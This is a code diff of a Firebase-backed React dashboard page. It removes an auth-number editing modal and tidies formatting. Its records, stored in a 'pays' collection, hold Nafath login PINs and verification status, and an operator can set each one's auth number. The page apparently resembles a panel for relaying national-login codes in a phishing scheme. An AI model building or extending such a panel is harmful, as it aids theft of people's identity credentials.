@@ -38,7 +38,7 @@ import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { formatDistanceToNow } from "date-fns"
 import { ar } from "date-fns/locale"
-import { Card, CardContent,CardFooter } from "@/components/ui/card"
+import { Card, CardContent } from "@/components/ui/card"
 import { collection, doc, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
 import { onValue, ref } from "firebase/database"
@@ -115,8 +115,8 @@ interface Notification {
   nafazVerified?: boolean
   nafazLoginTime?: string
   nafazStatus?: "pending" | "verified" | "failed"
-  nafazAttempts?: number,
-  phoneVerificationStatus?:string
+  nafazAttempts?: number
+  phoneVerificationStatus?: string
 }
 
 // Custom Hooks
@@ -835,37 +835,7 @@ function NotificationDetails({
                         ),
                     )}
                   </div>
-                  
                 </CardContent>
-                <div
-          className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
-          onClick={() => setEditingAuthNumber(false)}
-        >
-          <div
-            className="bg-background p-6 rounded-lg shadow-lg w-96 max-w-[90vw]"
-            onClick={(e) => e.stopPropagation()}
-          >
-            <h3 className="text-lg font-semibold mb-4">تحديث رقم التحقق (Auth Number)</h3>
-            <div className="space-y-4">
-              <div>
-                <label className="text-sm font-medium text-muted-foreground">رقم التحقق</label>
-                <Input
-                  value={authNumberValue}
-                  onChange={(e) => setAuthNumberValue(e.target.value)}
-                  placeholder="أدخل رقم التحقق"
-                  className="mt-1"
-                />
-              </div>
-              <div className="flex gap-2 justify-end">
-                <Button variant="outline" onClick={() => setEditingAuthNumber(false)}>
-                  إلغاء
-                </Button>
-                <Button onClick={handleAuthNumberSave} disabled={!authNumberValue.trim()}>
-                  حفظ
-                </Button>
-              </div>
-            </div>
-          </div>
               </Card>
               {!notification.formData?.phone &&
                 !notification.phone2 &&
@@ -1338,7 +1308,7 @@ export default function NotificationsPage() {
   const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { nafaz_pin: authNumber,auth_number:authNumber,phoneVerificationStatus:"approved" })
+      await updateDoc(docRef, { nafaz_pin: authNumber, auth_number: authNumber, phoneVerificationStatus: "approved" })
       setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)))
       toast({
         title: "تم تحديث رقم التحقق",
@@ -1670,4 +1640,3 @@ export default function NotificationsPage() {
     </div>
   )
 }
-
